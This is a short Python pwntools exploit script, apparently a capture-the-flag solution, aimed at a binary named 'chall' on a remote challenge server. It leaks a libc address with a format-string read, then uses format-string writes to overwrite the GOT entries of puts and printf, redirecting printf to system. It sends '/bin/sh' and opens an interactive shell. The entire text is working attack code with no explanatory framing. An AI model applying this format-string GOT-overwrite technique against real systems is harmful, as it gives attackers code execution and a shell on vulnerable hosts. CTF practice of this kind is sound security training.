#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = remote('chall.v1t.site', 30213)

io.sendlineafter(b"name?", b"A"*8)
io.sendlineafter(b"want",  b"%47$lx")

io.recvline()
libc.address = int(io.recvline().strip().decode(), 16) - 0x2a28b

io.sendlineafter(b"!", fmtstr_payload(8, {exe.got.puts: 0x4012d3}, write_size='byte'))
io.sendline(fmtstr_payload(9, {exe.got.printf: libc.sym.system}, numbwritten=0, write_size='byte'))
io.sendline(b'/bin/sh\x00')
io.interactive()

